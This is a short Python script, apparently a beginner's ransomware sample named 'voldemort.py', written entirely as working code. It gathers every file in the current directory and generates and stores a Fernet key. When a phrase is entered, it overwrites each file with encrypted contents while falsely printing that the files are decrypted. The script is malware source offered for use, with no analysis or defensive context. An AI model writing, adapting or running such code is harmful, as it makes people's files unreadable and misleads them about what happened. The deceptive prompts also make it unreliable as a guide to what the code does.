#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
#finding files

files=[] #creating list of files
for file in os.listdir(): #loop thats seeking for files
    if file == "voldemort.py" or file == "thekey.key" or file == "voldemort_decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files) #show all files in directiry

key = Fernet.generate_key() #generate key

with open("thekey.key", "wb") as thekey: #write down the key as file
    thekey.write(key)

secretphrase= "coffe"

user_phrase= input("Enter the secret phrase to decrypt your files\n")
if user_phrase ==secretphrase:

    #loop for every file in directory do decrypt
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read() #open file
        content_encrypted = Fernet(key).encrypt(content) #encrypt
        with open(file, "wb") as thefile:
            thefile.write(content_encrypted) #write encrypted content into file
        print("congrats, your're files are decrypted!")

else:
    print("Sorry, wrong secret phrase")
#print(key)
